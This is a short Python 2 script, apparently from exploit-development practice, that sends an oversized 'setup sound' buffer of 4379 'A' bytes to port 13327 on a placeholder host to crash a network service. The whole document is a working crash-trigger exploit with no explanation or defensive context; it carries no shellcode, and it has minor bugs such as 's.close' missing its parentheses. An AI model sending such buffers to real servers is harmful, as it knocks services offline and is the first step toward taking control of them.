#!/usr/bin/python
# This is used to replicate the crash using a public exploit.
import socket

host = "<attacker IP>"

crash = "\x41" * 4379

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*}Sending evil buffer…"

s.connect((host, 13327))
print s.recv(1024)

s.send(buffer)
s.close

print "[*]Payload Sent !"
